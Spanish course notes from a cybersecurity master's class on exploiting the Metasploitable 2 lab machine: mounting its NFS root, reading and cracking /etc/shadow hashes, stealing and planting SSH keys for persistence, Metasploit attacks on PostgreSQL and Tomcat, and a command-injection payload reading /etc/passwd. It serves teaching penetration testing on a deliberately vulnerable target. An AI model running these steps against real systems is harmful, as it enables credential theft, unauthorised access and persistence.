> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 25**
> **Módulo:** MODULO3
> **Tema:** Clase 25
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 25. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y objetivos de la sesión

El profesor **Dani** cierra prácticamente el ciclo de explotación de Metasploitable 2.

La sesión tiene un propósito claro: consolidar lo que quedó confuso en clases anteriores (especialmente NFS y claves SSH) y completar los servicios pendientes: **PostgreSQL, Apache Tomcat** y una primera aproximación a vulnerabilidades web (Command Injection, robots.txt, Feroxbuster).

El hilo que conecta toda la sesión: la información extraída de un servicio frecuentemente abre la puerta al siguiente.

Los usuarios encontrados por SMTP sirven para SSH; los hashes del NFS sirven para phpMyAdmin; las credenciales de Tomcat sirven para explotar la vulnerabilidad autenticada.

**Nota adicional:** durante el descanso de la clase, algunos alumnos comentaron que usaban Claude para hacer resúmenes de las sesiones pasándole la transcripción descargada, lo que generó debate sobre si las clases se podrán seguir descargando.

## 2.

Repaso completo de NFS --- montar, leer hashes y claves SSH

### El flujo completo de explotación NFS

NFS (*Network File System*, puerto 2049) permite compartir carpetas en red en Linux, análogo a SMB en Windows.

En Metasploitable 2 la **raíz completa del sistema** está compartida, haciendo de este el vector de mayor impacto de toda la máquina.

# Paso 1: listar carpetas compartidas

showmount -e IP_OBJETIVO

# Resultado: / accesible para * → todo el sistema está compartido

# Paso 2: crear carpeta local y montar

```bash
mkdir ~/Desktop/carpeta_meta2 sudo mount -t nfs IP_OBJETIVO:/ ~/Desktop/carpeta_meta2
```

# Paso 3: navegar el sistema de ficheros de la víctima

```bash
ls ~/Desktop/carpeta_meta2 # Muestra: bin, boot, etc, home, root, var...
```

**Errores frecuentes detectados en clase:** - Olvidar `sudo` → el montaje falla por permisos. - Olvidar los dos puntos y la barra: la sintaxis exacta es `IP:/` seguido de la ruta local.

### Leer hashes del /etc/shadow y romperlos

```bash
cat ~/Desktop/carpeta_meta2/etc/shadow # Hashes de contraseñas de todos los usuarios
```

**Identificar el tipo de hash por prefijo:**

Prefijo Algoritmo Modo Hashcat
 ----------- ---------------------- -------------
 `$1$` MD5crypt 500
 `$5$` SHA-256crypt 7400
 `$6$` SHA-512crypt 1800
 `*` o `!` Cuenta deshabilitada --
Herramienta para confirmar: `hash-identifier HASH`

**Romper hashes con John the Ripper:**

# Guardar los hashes en un fichero

```bash
cat ~/Desktop/carpeta_meta2/etc/shadow > hashes.txt
```

# Lanzar John

john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Ver contraseñas ya rotas (John las guarda internamente)

john --show hashes.txt

**Romper hashes con Hashcat (GPU, más rápido):**

hashcat -m 500 hashes.txt /usr/share/wordlists/rockyou.txt

**Advertencia práctica:** RockYou es un diccionario enorme.

Lanzarlo completo puede congelar la máquina virtual con pocos recursos.

Si se congela, `Ctrl+C` para interrumpir y revisar los resultados parciales con `john --show`.

**Resultado de la demo:** se rompieron los hashes de los usuarios `sys` (contraseña: `batman`), `klog` (contraseña: `123456789`) y `service` (contraseña: `service`).

**Por qué importa:** las contraseñas obtenidas sirven para acceder a otros servicios de la misma máquina.

Los usuarios del sistema pueden reutilizar contraseñas en SSH, FTP, bases de datos, etc.

## 3.

Claves SSH a través de NFS --- robar y plantar

Con acceso al sistema de ficheros completo vía NFS, se puede acceder al directorio `.ssh` oculto de cualquier usuario:

```bash
ls -la ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/
```

# Muestra: id_rsa (clave privada), id_rsa.pub (clave pública), authorized_keys

### Vector 1 --- Robar la clave privada existente

```bash
cp ~/Desktop/carpeta_meta2/home/msfadmin/.ssh/id_rsa . chmod 600 id_rsa # Permisos obligatorios para una clave privada ssh -i id_rsa root@IP_OBJETIVO # Conexión usando la clave robada
```

**Hallazgo del laboratorio:** la misma clave pública estaba en el `authorized_keys` tanto de `msfadmin` como de `root`.

Al conectarse como `msfadmin` pedía contraseña (clave privada protegida), pero al probar con `root` la conexión funcionó sin contraseña.

### Vector 2 --- Plantar una clave propia (persistencia)

# Generar un par de claves nuevo (sin passphrase para no pedir contraseña)

```bash
ssh-keygen -t rsa
```

# Enter, Enter (sin passphrase, sin nombre personalizado)

# Añadir la clave pública al authorized_keys de root (>> añade sin sobrescribir)

```bash
cat id_rsa.pub >> ~/Desktop/carpeta_meta2/root/.ssh/authorized_keys
```

# Dar permisos correctos a la clave privada

```bash
chmod 600 id_rsa
```

# Conectar con nuestra propia clave

```bash
ssh -i id_rsa root@IP_OBJETIVO
```

**Por qué** `>>` **y no** `>`**:** el operador `>` sobrescribiría el contenido existente.

Con `>>` se añade al final, manteniendo las claves anteriores y sumando la nuestra.

**Por qué esto es persistencia:** aunque se cambien contraseñas o se parchee la vulnerabilidad NFS, la clave pública plantada sigue en el `authorized_keys`.

El acceso permanece hasta que alguien la elimine manualmente.

**Metáfora:** `authorized_keys` es el listado de personas que tienen llave de tu casa.

Añadir la clave pública es copiar una llave.

Cambiar la cerradura (contraseña) no afecta a quien tiene copia de llave.

## 4.

Puerto 5432 --- PostgreSQL: fuerza bruta y exploit autenticado

PostgreSQL es una base de datos relacional muy extendida.

La versión de Metasploitable 2 tiene credenciales débiles y una vulnerabilidad que **requiere autenticación** para explotarse (vulnerabilidad autenticada).

**Paso 1 --- Fuerza bruta para obtener credenciales:**

msfconsole search postgres login use [número] show options set RHOSTS IP_OBJETIVO set USER_FILE usuarios.txt set PASS_FILE passwords.txt run

# Resultado: usuario postgres / contraseña postgres

**Paso 2 --- Explotar la vulnerabilidad autenticada:**

search postgres payload use [módulo Linux] show options set RHOSTS IP_OBJETIVO set USERNAME postgres set PASSWORD postgres run shell whoami # → postgres

**Usuario obtenido:** `postgres` --- la cuenta de servicio de la base de datos.

No es root; para escalar habría que usar `sudo -l` y GTFOBins si hay algún privilegio disponible (en este caso no hay).

**Concepto clave --- vulnerabilidad autenticada:** muchas vulnerabilidades requieren credenciales válidas para ser explotadas.

Un pentest de caja gris donde el cliente proporciona un usuario de bajo privilegio permite explotar estas vulnerabilidades para escalar hasta administrador.

## 5.

Puerto 8180 --- Apache Tomcat: credenciales y exploit autenticado

**Apache Tomcat** es un servidor de aplicaciones Java.

Expone un panel de administración en el puerto 8180 (no en el 80 por defecto; hay que especificar el puerto en el navegador: `http://IP:8180`).

La explotación sigue el mismo esquema de dos pasos que PostgreSQL.

**Paso 1 --- Extraer credenciales del panel de administración:**

msfconsole search tomcat administration use [módulo auxiliar] show options set RHOSTS IP_OBJETIVO set RPORT 8180 run

# Resultado: usuario tomcat / contraseña tomcat

**Paso 2 --- Explotar la vulnerabilidad autenticada (**`mgr_deploy`**):**

search tomcat mgr_deploy use [módulo, ej. #5] show options set RHOSTS IP_OBJETIVO set RPORT 8180 set HttpUsername tomcat set HttpPassword tomcat run shell whoami # → tomcat55

**Usuario obtenido:** `tomcat55` --- la cuenta de servicio de Tomcat.

Igual que `www-data` para el servidor web o `postgres` para la base de datos.

**Patrón consolidado:** cada servicio comprometido da acceso a su cuenta de servicio específica.

Para llegar a root siempre hace falta una escalada de privilegios posterior.

## 6.

Puerto 80 --- Primera aproximación al hacking web

### robots.txt: el mapa de lo que no quieren que encuentres

El fichero `robots.txt` indica a los motores de búsqueda qué URLs no deben indexar.

Para un auditor es el primer lugar donde buscar: todo lo que el administrador no quiere que aparezca en Google está listado ahí.

http://IP_OBJETIVO/robots.txt

En Metasploitable 2 el `robots.txt` de una aplicación lista: - `/passwords/` → fichero con usuarios y contraseñas en **texto claro**. - `/config/config.inc.php` → fichero de configuración de la base de datos con usuario `root`, contraseña vacía, host `localhost`.

**Con estas credenciales se accede a MySQL directamente:**

mysql -h IP_OBJETIVO -u root # Sin contraseña (-p vacío o sin -p) use dvwa; show tables; select * from users; # Usuarios y contraseñas hasheadas de DVWA

Las contraseñas están hasheadas en MD5 (confirmable con `hash-identifier`).

Se pueden romper con John o Hashcat usando RockYou.

### Feroxbuster: fuzzing recursivo

Además de FFUF y DirBuster, **Feroxbuster** hace fuzzing recursivo: cuando encuentra un directorio, busca automáticamente subdirectorios dentro de él, aumentando la cobertura.

feroxbuster --url http://IP_OBJETIVO/mutillidae/

Resultado: encuentra subdirectorios anidados que FFUF solo encuentra si se apunta manualmente a cada ruta descubierta.

### Command Injection --- primera vulnerabilidad web en acción

DVWA tiene un módulo de "Command Execution" (ping) que espera una IP, lanza ping y muestra el resultado.

Si la validación del input del servidor es deficiente, se pueden encadenar comandos:

# Input en el formulario:

127.0.0.1; cat /etc/passwd

# El servidor ejecuta:

ping 127.0.0.1 ; cat /etc/passwd

El punto y coma termina el ping e inicia la lectura de `/etc/passwd`.

El servidor ejecuta ambos y devuelve las dos salidas.

**Variantes para evitar filtros:** - `;` (punto y coma) --- ejecuta ambos siempre - `&&` --- ejecuta el segundo solo si el primero tuvo éxito - `|` (pipe) --- la salida del primero es entrada del segundo - `&` (ampersand) --- ejecuta en paralelo

> [!important] **Distinción terminológica importante:** - **RCE** (*Remote Code Execution*): ejecución de código desde una máquina remota externa. - **LCE/Command Injection**: ejecución de código en el propio servidor a través de un input mal validado.

En este ejercicio el atacante controla un input que el servidor ejecuta localmente.

El principio es análogo a la inyección de comandos con `find` que se vio en las clases de terminal Bash: el código del servidor llama a una función del sistema (ping) con un argumento controlable por el usuario sin sanitizarlo.

## 7.

### Herramienta extra: script de automatización de enumeración (alumno Gil)

Durante la sesión, el alumno **Gil** compartió pantalla para mostrar un script Bash propio que combina `netdiscover` y `nmap` en un flujo automatizado:

- Muestra las IPs descubiertas en la red.
- Permite seleccionar una IP de la tabla.
- Configura el nivel de verbosidad del Nmap.
- Selecciona qué puertos analizar.
- Guarda todos los resultados organizados en carpetas (por fecha/máquina).
- Exporta en formato TXT y MD para poder pasarlo como contexto a Claude.

El profesor valoró positivamente la herramienta y sugirió integrar scripts Python de Exploit-DB como alternativa a los módulos de Metasploit, para reducir la dependencia del framework.

## 8.

Próxima sesión

- Repasar TWiki (el exploit falló en esta sesión por un problema con la ruta de la página).
- Terminar los servicios pendientes de Metasploitable 2.
- Comenzar el módulo de **hacking web** con profundidad: Command Injection completo, XSS almacenado/reflejado, SQL Injection y más vulnerabilidades del OWASP Top 10 con Burp Suite.

## 9.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
------------------------------------------------- ----------------------------------------------------------------------------------------------------------
 *DNFS / NPS / NFS* **NFS** (*Network File System*) -- protocolo de carpetas compartidas en Linux
 *show month / show mode* **showmount** -- comando para listar carpetas compartidas vía NFS
 *mode menos t / mode mount* `mount -t nfs` -- comando para montar una carpeta NFS localmente
 *hash identifyer / hands / hash info* **hash-identifier** -- herramienta para identificar el tipo de hash
 *hashtag / hascart / hashcard* **Hashcat** -- herramienta de cracking de hashes con GPU
 *John format / John show hasses* `john --format=md5crypt` / `john --show` -- cracking y visualización con John the Ripper
 *autoridad de un keys / autoridad de un quicio* `~/.ssh/authorized_keys` -- archivo con claves públicas SSH autorizadas
 *IDRSA / IRSA / idea de usar* `id_rsa` -- nombre del fichero de clave privada SSH
 *SCHL / SCH / LCH* **SSH** (*Secure Shell*) -- protocolo de acceso remoto seguro
 *Postgreb / PostGres SQL / Posgle* **PostgreSQL** -- base de datos relacional
 *Apache Tonka / TonCAD / TomCad* **Apache Tomcat** -- servidor de aplicaciones Java
 *FerosBackstent / FenotBaxter / Feroxbaxter* **Feroxbuster** -- herramienta de fuzzing web recursivo
 *robot TXT / robotpunto XT / RobotTXT* `robots.txt` -- fichero estándar que lista URLs que no se quieren indexar
 *coma de secution / código de secution* **Command Execution / Command Injection** -- vulnerabilidad web que permite ejecutar comandos del sistema
 *RC / RFE / Remote Code Secution* **RCE** (*Remote Code Execution*) -- ejecución remota de código
 *Wappaliser / Wappalizer* **Wappalyzer** -- extensión del navegador que detecta tecnologías web
 *Bourch / bussuite / rootsuite* **Burp Suite** -- proxy de interceptación para auditorías web
 *Dirt B UFF / FVUF* **FFUF** (*Fuzz Faster U Fool*) / **DirBuster** -- herramientas de fuzzing web
 *mgr upload / mg rp load* `mgr_deploy` -- módulo de Metasploit para explotar Apache Tomcat
 *implanket / impacket* **Impacket** -- colección de scripts Python para protocolos Windows
 *Claudia / Claude / Claudio / la IA* **Claude** (Anthropic) -- IA usada por los alumnos para generar resúmenes de las clases

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[resumen_master_clase23.md|resumen_master_clase23]— Escalada de Privilegios, Metasploit, SSH
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables II — Metasploitable.md|Explotación Avanzada de Servicios Vulnerables II — Metasploitable]— Escalada de Privilegios, SSH, XSS
- [[../../Apuntes/06 - Explotacion y Post-Explotacion/Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL.md|Explotación Avanzada de Servicios Vulnerables III — NFS, Tomcat y MySQL]— Escalada de Privilegios, SSH, XSS
- [[../../apuntes Chema/Maquinas/Explotación avanzada de servicios vulnerables II.md|Explotación avanzada de servicios vulnerables II]— Escalada de Privilegios, SSH, XSS
- [[../../apuntes Chema/Maquinas/Explotación Avanzada de Servicios Vulnerables III.md|Explotación Avanzada de Servicios Vulnerables III]— Escalada de Privilegios, SSH, XSS
- [[resumen_master_clase21.md|resumen_master_clase21]— Escalada de Privilegios, Metasploit, SSH

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/Feroxbuster|Feroxbuster]]
- [[comandos/FFUF|FFUF]]
- [[comandos/Hydra|Hydra]]
- [[comandos/John_Hashcat|John / Hashcat]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SMB_Impacket|SMB / Impacket]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/SQL Injection.md|SQL Injection]]
- [[Apuntes/05 - Auditoria Web/Vulnerabilidades Web — OWASP Top 10 y Burp Suite.md|XSS]]

> #burpsuite #command-injection #escalada-privilegios #feroxbuster #ffuf #hydra #ia #john #linux #metasploit #metasploitable #nmap #pentest #redes #smb-impacket #sqli #ssh #windows #xss
